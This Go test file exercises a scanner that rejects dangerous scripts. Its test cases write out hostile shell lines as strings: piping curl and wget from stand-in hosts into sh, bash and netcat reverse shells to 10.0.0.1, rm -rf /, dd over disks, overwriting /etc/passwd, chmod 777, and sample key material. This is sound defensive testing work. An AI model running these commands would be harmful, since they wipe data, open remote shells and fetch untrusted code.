package capability

import (
	"strings"
	"testing"
)

func TestScanSource_RejectsAllTwelvePatterns(t *testing.T) {
	cases := []struct {
		name     string
		source   string
		wantStep string
	}{
		{
			"rm_rf_root_slash",
			"#!/bin/bash\nrm -rf /\n",
			"scanner:rm_rf_root",
		},
		{
			"rm_rf_root_with_flags",
			"#!/bin/bash\nrm -rf --no-preserve-root /\n",
			"scanner:rm_rf_root",
		},
		{
			"rm_rf_variable",
			"#!/bin/bash\nTARGET=/tmp/x\nrm -rf $TARGET\n",
			"scanner:rm_rf_variable",
		},
		{
			"curl_pipe_sh",
			"#!/bin/bash\ncurl https://evil.example/install.sh | sh\n",
			"scanner:curl_pipe_sh",
		},
		{
			"curl_pipe_bash",
			"#!/bin/bash\ncurl -sSL https://x.example/i | bash\n",
			"scanner:curl_pipe_sh",
		},
		{
			"wget_pipe_sh",
			"#!/bin/bash\nwget -qO- https://x.example/i | sh\n",
			"scanner:wget_pipe_sh",
		},
		{
			"reverse_shell_bash_devtcp",
			"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
			"scanner:reverse_shell_bash",
		},
		{
			"reverse_shell_nc_e",
			"#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n",
			"scanner:reverse_shell_nc",
		},
		{
			"hardcoded_aws_key",
			"#!/bin/bash\nexport AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n",
			"scanner:hardcoded_aws_key",
		},
		{
			"hardcoded_private_key",
			"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAK...\n-----END RSA PRIVATE KEY-----\n",
			"scanner:hardcoded_private_key",
		},
		{
			"absolute_path_write_etc",
			"#!/bin/bash\necho 'evil' > /etc/passwd\n",
			"scanner:absolute_path_write_root",
		},
		{
			"absolute_path_write_proc",
			"#!/bin/bash\ncat foo >> /proc/sys/kernel/something\n",
			"scanner:absolute_path_write_root",
		},
		{
			"chmod_777",
			"#!/bin/bash\nchmod 777 /var/data\n",
			"scanner:chmod_777",
		},
		{
			"chmod_R_777",
			"#!/bin/bash\nchmod -R 777 /var/data\n",
			"scanner:chmod_777",
		},
		{
			"dd_destructive_sda",
			"#!/bin/bash\ndd if=/dev/zero of=/dev/sda bs=1M\n",
			"scanner:dd_destructive",
		},
		{
			"dd_destructive_nvme",
			"#!/bin/bash\ndd if=/dev/urandom of=/dev/nvme0n1\n",
			"scanner:dd_destructive",
		},
		{
			"mkfs_unmounted",
			"#!/bin/bash\nmkfs.ext4 /dev/sdb1\n",
			"scanner:mkfs_unmounted",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := ScanSourceOrError(tc.source)
			if err == nil {
				t.Fatalf("expected rejection, got clean pass for:\n%s", tc.source)
			}
			pve, ok := err.(*PayloadValidationError)
			if !ok {
				t.Fatalf("expected *PayloadValidationError, got %T", err)
			}
			found := false
			for _, fe := range pve.Errors {
				if fe.Step == tc.wantStep {
					found = true
					if fe.Line <= 0 {
						t.Errorf("expected positive line number, got %d", fe.Line)
					}
					if fe.Snippet == "" {
						t.Errorf("expected non-empty snippet for %s", tc.wantStep)
					}
				}
			}
			if !found {
				t.Errorf("did not find %s in rejections: %v", tc.wantStep, pve.Errors)
			}
		})
	}
}

func TestScanSource_PassesCleanBash(t *testing.T) {
	// A well-behaved shell script should pass cleanly.
	src := `#!/bin/bash
set -euo pipefail

main() {
  local input="$1"
  if [[ -z "$input" ]]; then
    echo "usage: $0 <input>" >&2
    exit 2
  fi
  local cleaned
  cleaned=$(echo "$input" | tr -d '[:space:]')
  echo "result: $cleaned"
}

main "$@"
`
	if err := ScanSourceOrError(src); err != nil {
		t.Fatalf("expected clean pass, got: %v", err)
	}
}

func TestScanSource_PassesCleanPython(t *testing.T) {
	src := `#!/usr/bin/env python3
import json
import sys

def main():
    if len(sys.argv) < 2:
        print("usage: prog <file>", file=sys.stderr)
        sys.exit(2)
    with open(sys.argv[1]) as f:
        data = json.load(f)
    print(len(data))

if __name__ == "__main__":
    main()
`
	if err := ScanSourceOrError(src); err != nil {
		t.Fatalf("expected clean pass, got: %v", err)
	}
}

func TestScanSource_ReportsCorrectLineNumber(t *testing.T) {
	// The match is on line 3, column 1. Verify line reporting.
	src := "#!/bin/bash\n" + // line 1
		"set -e\n" + // line 2
		"rm -rf /\n" + // line 3
		"echo done\n" // line 4
	err := ScanSourceOrError(src)
	if err == nil {
		t.Fatal("expected rejection")
	}
	pve := err.(*PayloadValidationError)
	var got FieldError
	for _, fe := range pve.Errors {
		if fe.Step == "scanner:rm_rf_root" {
			got = fe
			break
		}
	}
	if got.Line != 3 {
		t.Errorf("line = %d, want 3", got.Line)
	}
	if !strings.Contains(got.Snippet, "rm -rf") {
		t.Errorf("snippet should contain the match, got %q", got.Snippet)
	}
}

func TestScanSource_AccumulatesMultipleMatches(t *testing.T) {
	// Two different patterns in the same source — both should be
	// reported, not just the first one.
	src := "#!/bin/bash\n" +
		"chmod 777 /var/data\n" +
		"echo evil > /etc/passwd\n"
	err := ScanSourceOrError(src)
	if err == nil {
		t.Fatal("expected rejection")
	}
	pve := err.(*PayloadValidationError)
	steps := make(map[string]bool)
	for _, fe := range pve.Errors {
		steps[fe.Step] = true
	}
	if !steps["scanner:chmod_777"] {
		t.Error("chmod_777 not reported")
	}
	if !steps["scanner:absolute_path_write_root"] {
		t.Error("absolute_path_write_root not reported")
	}
}

func TestScanSource_EmptySourceReturnsNil(t *testing.T) {
	if err := ScanSourceOrError(""); err != nil {
		t.Errorf("empty source should return nil, got: %v", err)
	}
}

func TestLineColumn_MultiLineInput(t *testing.T) {
	// Offsets: 'a' is at 0,1 → line 1, col 1
	//          'b' is at 1,2 (line 1)
	//          'c' is at 2,3 (line 1) — wait, all on line 1
	// Test with actual newlines.
	src := "abc\ndef\nghi"
	cases := []struct {
		offset, wantLine, wantCol int
	}{
		{0, 1, 1},  // 'a'
		{2, 1, 3},  // 'c'
		{4, 2, 1},  // 'd' (first char of line 2)
		{6, 2, 3},  // 'f'
		{8, 3, 1},  // 'g'
		{10, 3, 3}, // 'i'
	}
	for _, tc := range cases {
		gotLine, gotCol := lineColumn(src, tc.offset)
		if gotLine != tc.wantLine || gotCol != tc.wantCol {
			t.Errorf("lineColumn(src, %d) = (%d, %d), want (%d, %d)",
				tc.offset, gotLine, gotCol, tc.wantLine, tc.wantCol)
		}
	}
}

func TestPoisonPatterns_AllTwelveCompiled(t *testing.T) {
	// Defensive: if a developer deletes a row by accident, this test
	// fires before the binary ships. The spec §7.1 list is exhaustive.
	want := []string{
		"rm_rf_root", "rm_rf_variable",
		"curl_pipe_sh", "wget_pipe_sh",
		"reverse_shell_bash", "reverse_shell_nc",
		"hardcoded_aws_key", "hardcoded_private_key",
		"absolute_path_write_root", "chmod_777",
		"dd_destructive", "mkfs_unmounted",
	}
	if len(poisonPatterns) != len(want) {
		t.Fatalf("poisonPatterns has %d entries, want %d",
			len(poisonPatterns), len(want))
	}
	seen := make(map[string]bool)
	for _, p := range poisonPatterns {
		seen[p.Name] = true
		if p.Regex == nil {
			t.Errorf("pattern %s has nil regex", p.Name)
		}
		if p.Message == "" {
			t.Errorf("pattern %s has empty message", p.Name)
		}
		if !strings.HasPrefix(p.Step, "scanner:") {
			t.Errorf("pattern %s step %q should start with 'scanner:'", p.Name, p.Step)
		}
	}
	for _, n := range want {
		if !seen[n] {
			t.Errorf("pattern %s missing from poisonPatterns", n)
		}
	}
}
